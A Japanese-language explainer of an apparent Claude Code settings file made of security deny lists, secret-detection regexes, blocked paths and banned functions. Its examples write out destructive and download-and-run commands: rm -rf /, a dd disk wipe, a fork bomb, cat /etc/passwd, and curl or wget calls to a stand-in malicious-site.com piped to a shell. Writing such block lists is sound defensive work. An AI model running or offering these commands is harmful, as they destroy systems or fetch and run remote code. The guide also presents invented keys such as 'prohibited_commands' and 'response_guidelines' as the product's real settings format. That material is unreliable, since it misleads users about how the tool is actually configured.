## Claude Code 設定ファイル 全行解説

Claude Code では、複数レベルでの設定管理をサポートしています：
- **ユーザー設定**: `~/.claude/settings.json`
- **プロジェクト設定**: `.claude/settings.json` 
- **ローカル設定**: `.claude/settings.local.json`
- **エンタープライズポリシー**: 管理者によって設定

設定の優先順位は、エンタープライズポリシー > プロジェクト設定 > ユーザー設定 の順となります。

### 1. セキュリティセクション

### `"security": {`
セキュリティ関連の設定をまとめるメインセクション。システムを保護するための各種制限を定義します。

### `"prohibited_commands": [`
実行を禁止するコマンドのリスト。これらのコマンドが含まれるコード生成や実行提案を防ぎます。

#### `"rm -rf"`
- **意味**: Linuxの強制削除コマンド（recursive + force）
- **危険性**: ディレクトリとその中身を問答無用で削除
- **実例**: `rm -rf /` でシステム全体が削除される可能性

#### `"sudo rm -rf"`
- **意味**: 管理者権限での強制削除コマンド
- **危険性**: より強力な権限での削除実行、システムファイルも削除可能
- **実例**: `sudo rm -rf /usr` でシステムが使用不能に

#### `"del /f /q"`
- **意味**: Windowsの強制削除コマンド（force + quiet）
- **危険性**: 確認なしでファイルを削除
- **実例**: `del /f /q C:\Windows\*` でWindowsシステムファイルが削除

#### `"format"`
- **意味**: ディスク全体をフォーマット
- **危険性**: ハードディスク全体のデータが消去
- **実例**: `format C:` でCドライブが初期化

#### `"dd if=/dev/zero"`
- **意味**: ディスクを0で上書き
- **危険性**: 完全なデータ消去、復旧不可能
- **実例**: `dd if=/dev/zero of=/dev/sda` でハードディスク全体が0で上書き

#### `":(){ :|:& };:"`
- **意味**: フォークボム（fork bomb）
- **危険性**: 無限にプロセスを生成しシステムを停止
- **実例**: 実行するとシステムリソースを全て消費

#### `"chmod 777"`
- **意味**: ファイルのアクセス権限を全開放
- **危険性**: 全ユーザーが読み書き実行可能になる
- **実例**: `chmod 777 /etc/passwd` でパスワードファイルが誰でも編集可能

#### `"sudo chmod -R 777"`
- **意味**: 管理者権限でディレクトリ全体の権限を全開放
- **危険性**: セキュリティが完全に無効化
- **実例**: `sudo chmod -R 777 /` でシステム全体のセキュリティが破綻

### `"prohibited_patterns": [`
正規表現パターンでコード内の危険な記述を検出。機密情報のハードコーディングを防止。

#### `"password\\s*=\\s*[\"'][^\"']+[\"']"`
- **意味**: パスワードの直接代入を検出
- **検出例**: `password = "mypassword123"`
- **理由**: パスワードがコードに直接書かれるとGitにコミットされる危険

#### `"api_key\\s*=\\s*[\"'][^\"']+[\"']"`
- **意味**: APIキーの直接代入を検出
- **検出例**: `api_key = "sk-1234567890abcdef"`
- **理由**: APIキーの漏洩は不正利用や課金被害に直結

#### `"secret\\s*=\\s*[\"'][^\"']+[\"']"`
- **意味**: シークレットキーの直接代入を検出
- **検出例**: `secret = "mysecretkey"`
- **理由**: 秘密鍵の漏洩はセキュリティ侵害の原因

#### `"token\\s*=\\s*[\"'][^\"']+[\"']"`
- **意味**: トークンの直接代入を検出
- **検出例**: `token = "ghp_1234567890abcdef"`
- **理由**: 認証トークンの漏洩でアカウント乗っ取りの可能性

#### `"private_key\\s*=\\s*[\"'][^\"']+[\"']"`
- **意味**: 秘密鍵の直接代入を検出
- **検出例**: `private_key = "-----BEGIN RSA PRIVATE KEY-----"`
- **理由**: 暗号化の秘密鍵漏洩は致命的なセキュリティ問題

### 2. ファイル制限セクション

### `"file_restrictions": {`
ファイルアクセスに関する制限を定義。

### `"prohibited_extensions": [`
作成・操作を禁止するファイル拡張子のリスト。

#### `".exe", ".bat", ".cmd", ".scr", ".pif", ".vbs", ".jar"`
- **理由**: 実行可能ファイルやスクリプトファイル
- **危険性**: マルウェアやウイルスの可能性
- **例**: `.exe`ファイルはWindows実行ファイル、`.bat`はバッチファイル

### `"prohibited_paths": [`
アクセスを禁止するファイルパスのリスト。

#### `"/etc/passwd"`
- **意味**: Linuxのユーザー情報ファイル
- **危険性**: システムユーザー情報の漏洩
- **内容**: ユーザー名、UID、ホームディレクトリ情報

#### `"/etc/shadow"`
- **意味**: Linuxのパスワードハッシュファイル
- **危険性**: パスワードハッシュの漏洩でクラッキング可能
- **内容**: 暗号化されたパスワード情報

#### `"C:\\Windows\\System32"`
- **意味**: Windowsのシステムファイル格納ディレクトリ
- **危険性**: システムファイルの改変でOS破損
- **内容**: 重要なシステムDLLやドライバー

#### `"~/.ssh/id_rsa"`
- **意味**: SSH秘密鍵ファイル
- **危険性**: サーバーアクセス権限の漏洩
- **内容**: SSH接続用の秘密鍵

#### `"~/.aws/credentials"`
- **意味**: AWS認証情報ファイル
- **危険性**: AWSアカウントの不正利用
- **内容**: AWSアクセスキーとシークレットキー

### 3. コード安全性セクション

### `"code_safety": {`
コード生成・実行時の安全性を確保する設定。

### `"require_confirmation_for": [`
実行前に確認を求める操作のリスト。

#### `"database_operations"`
- **意味**: データベースの変更操作
- **例**: DELETE, UPDATE, DROP文
- **理由**: データ損失の可能性があるため

#### `"system_modifications"`
- **意味**: システム設定の変更
- **例**: レジストリ編集、設定ファイル変更
- **理由**: システム不安定化の可能性

#### `"network_requests"`
- **意味**: 外部ネットワークへのアクセス
- **例**: HTTP API呼び出し、データ送信
- **理由**: 意図しない情報漏洩の防止

#### `"file_deletions"`
- **意味**: ファイルの削除操作
- **例**: unlink(), os.remove()
- **理由**: 重要ファイルの誤削除防止

#### `"permission_changes"`
- **意味**: ファイル・ディレクトリの権限変更
- **例**: chmod, chown
- **理由**: セキュリティ設定の意図しない変更防止

### `"prohibited_functions": [`
使用を禁止する危険な関数のリスト。

#### `"eval()"`
- **意味**: 文字列をコードとして実行
- **危険性**: 任意コード実行攻撃の温床
- **例**: `eval("__import__('os').system('rm -rf /')")`

#### `"exec()"`
- **意味**: 動的にコードを実行
- **危険性**: evalと同様の任意コード実行
- **例**: `exec("import os; os.system('malicious_command')")`

#### `"system()"`
- **意味**: システムコマンドを実行
- **危険性**: OSコマンドインジェクション
- **例**: `system("rm -rf /tmp/*")`

#### `"shell_exec()"`
- **意味**: シェルコマンドを実行（PHP）
- **危険性**: コマンドインジェクション攻撃
- **例**: `shell_exec("cat /etc/passwd")`

#### `"passthru()"`
- **意味**: 外部プログラムを実行（PHP）
- **危険性**: システムコマンドの直接実行
- **例**: `passthru("wget malicious-site.com/malware")`

#### `"os.system()"`
- **意味**: OSコマンドを実行（Python）
- **危険性**: システムへの直接アクセス
- **例**: `os.system("curl -s malicious-site.com | sh")`

#### `"subprocess.call()"`
- **意味**: サブプロセスを呼び出し（Python）
- **危険性**: 外部プログラムの実行
- **例**: `subprocess.call(["rm", "-rf", "/"])`

### 4. 開発ガイドラインセクション

### `"development_guidelines": {`
セキュアな開発のためのベストプラクティス。

#### `"always_validate_input": true`
- **意味**: 全ての入力値を検証する
- **理由**: インジェクション攻撃の防止
- **例**: フォーム入力、API パラメータの検証

#### `"use_parameterized_queries": true`
- **意味**: パラメータ化クエリを使用
- **理由**: SQLインジェクション攻撃の防止
- **例**: `SELECT * FROM users WHERE id = ?` の形式

#### `"implement_rate_limiting": true`
- **意味**: レート制限を実装
- **理由**: DoS攻撃やブルートフォース攻撃の防止
- **例**: 1分間に100リクエストまで制限

#### `"log_security_events": true`
- **意味**: セキュリティイベントをログに記録
- **理由**: 攻撃の検知と証跡の保持
- **例**: ログイン失敗、権限エラーの記録

#### `"require_https": true`
- **意味**: HTTPS通信を必須とする
- **理由**: 通信の暗号化とデータ保護
- **例**: HTTPからHTTPSへの自動リダイレクト

#### `"sanitize_user_input": true`
- **意味**: ユーザー入力をサニタイズ
- **理由**: XSS攻撃の防止
- **例**: HTMLタグのエスケープ処理

### 5. 環境保護セクション

### `"environment_protection": {`
本番環境とデータの保護設定。

#### `"prevent_production_access": true`
- **意味**: 本番環境への直接アクセスを防止
- **理由**: 本番データの誤操作防止
- **例**: 本番DBへの直接接続を禁止

#### `"require_environment_variables": [`
環境変数での管理を必須とする設定項目。

##### `"DATABASE_URL"`
- **意味**: データベース接続情報
- **理由**: 接続情報のハードコーディング防止
- **例**: `DATABASE_URL=postgresql://user:pass@localhost/db`

##### `"API_KEYS"`
- **意味**: 外部サービスのAPIキー
- **理由**: 認証情報の安全な管理
- **例**: `OPENAI_API_KEY=sk-...`

##### `"SECRETS"`
- **意味**: アプリケーションの秘密情報
- **理由**: 暗号化キーやトークンの保護
- **例**: `JWT_SECRET=random_secret_key`

#### `"prohibited_hardcoded_values": [`
ハードコーディングを禁止する値のリスト。

##### `"localhost:3306"`
- **意味**: ローカルのMySQLデフォルトポート
- **理由**: 開発環境設定の本番流出防止
- **例**: データベース接続文字列での直接指定

##### `"127.0.0.1"`
- **意味**: ローカルループバックアドレス
- **理由**: 開発環境固有の設定の混入防止
- **例**: APIエンドポイントでの直接指定

##### `"admin:password"`
- **意味**: 典型的なデフォルト認証情報
- **理由**: 弱い認証情報の使用防止
- **例**: 管理者アカウントのデフォルト設定

##### `"root:root"`
- **意味**: 典型的なrootアカウント設定
- **理由**: セキュリティの脆弱性防止
- **例**: データベースのrootユーザー設定

### 6. プロジェクト構造セクション

### `"project_structure": {`
プロジェクトの標準的な構造と必要ファイル。

#### `"required_files": [`
プロジェクトに必須のファイルリスト。

##### `".env.example"`
- **意味**: 環境変数の設定例ファイル
- **理由**: 新しい開発者が設定を理解できる
- **内容**: 実際の値を除いた環境変数の雛形

##### `".gitignore"`
- **意味**: Git管理対象外ファイルの指定
- **理由**: 機密情報のコミット防止
- **内容**: `.env`, `*.log`, `node_modules`など

##### `"README.md"`
- **意味**: プロジェクトの説明書
- **理由**: 開発者の理解促進とセキュリティ注意点の共有
- **内容**: セットアップ手順、セキュリティ注意事項

##### `"requirements.txt"`
- **意味**: 依存関係の明示（Python）
- **理由**: 依存関係の管理と脆弱性チェック
- **内容**: パッケージ名とバージョン情報

#### `"prohibited_in_git": [`
Gitリポジトリに含めてはいけないファイル。

##### `".env"`
- **意味**: 環境変数ファイル
- **理由**: 機密情報が含まれる可能性
- **内容**: API キー、パスワード、秘密鍵

##### `"*.log"`
- **意味**: ログファイル
- **理由**: 機密情報や個人情報が含まれる可能性
- **内容**: アクセスログ、エラーログ

##### `"*.key"`
- **意味**: 秘密鍵ファイル
- **理由**: 暗号化キーの漏洩防止
- **内容**: SSL証明書、SSH鍵

##### `"*.pem"`
- **意味**: Privacy Enhanced Mail形式のファイル
- **理由**: 証明書や鍵の漏洩防止
- **内容**: SSL証明書、秘密鍵

##### `"config/database.yml"`
- **意味**: データベース設定ファイル
- **理由**: 接続情報の漏洩防止
- **内容**: データベース接続情報

##### `"secrets.json"`
- **意味**: 秘密情報を格納するJSONファイル
- **理由**: 各種認証情報の漏洩防止
- **内容**: API キー、トークン、パスワード

### 7. レスポンスガイドラインセクション

### `"response_guidelines": {`
Claude の回答方針を定義。

#### `"always_explain_security_implications": true`
- **意味**: セキュリティへの影響を常に説明
- **理由**: 開発者のセキュリティ意識向上
- **例**: 「この設定はXSS攻撃を防ぐために重要です」

#### `"suggest_secure_alternatives": true`
- **意味**: セキュアな代替手段を提案
- **理由**: より安全な実装の促進
- **例**: 「eval()の代わりにJSON.parse()を使用してください」

#### `"warn_about_potential_risks": true`
- **意味**: 潜在的なリスクについて警告
- **理由**: 予期しない脆弱性の防止
- **例**: 「この実装は権限昇格の可能性があります」

#### `"provide_best_practices": true`
- **意味**: ベストプラクティスを提供
- **理由**: セキュアな開発手法の普及
- **例**: 「パスワードは常にハッシュ化して保存してください」

### 設定管理コマンド

設定の表示と変更は以下のコマンドで行えます：

```bash
# 現在の設定を表示
claude config

# 特定の設定値を変更
claude config set model claude-3-5-sonnet-20241022

# 設定値を取得
claude config get model
```

### 権限管理

`/permissions` コマンドで権限設定を確認・更新できます：

```bash
# 権限状況を表示
/permissions

# 特定ファイルへのアクセス権を確認
/permissions check /path/to/file
```

### まとめ

この設定ファイルは、Claude Code を使用する際の包括的なセキュリティ対策を提供します。各設定項目は、実際のセキュリティインシデントや脆弱性から学んだ知見に基づいて設計されており、開発者が安全にコードを書けるように支援します。エンタープライズ環境では、管理者によるポリシーが常に適用されるため、チームや個人の設定と組み合わせて使用できます。
